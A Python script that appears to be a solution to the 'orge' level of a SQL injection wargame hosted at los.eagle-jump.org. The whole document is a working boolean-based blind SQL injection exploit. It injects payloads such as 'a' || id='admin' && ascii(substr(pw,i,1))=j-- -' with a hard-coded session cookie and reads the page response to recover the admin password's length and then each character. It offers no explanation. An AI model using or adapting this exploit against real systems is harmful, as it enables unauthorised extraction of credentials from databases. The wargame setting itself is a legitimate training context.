import requests, urllib

url = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

### get password length ###

plen = 1
while True:
    param = {"pw": "a' || id='admin' && length(pw)=" + str(plen) + "-- -"}
    response = requests.get(url, params=param, cookies=cookie)
    if "<h2>Hello admin</h2>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        param = {"pw": "a' || id='admin' && ascii(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            password += chr(j)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))
            plen += 1
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)
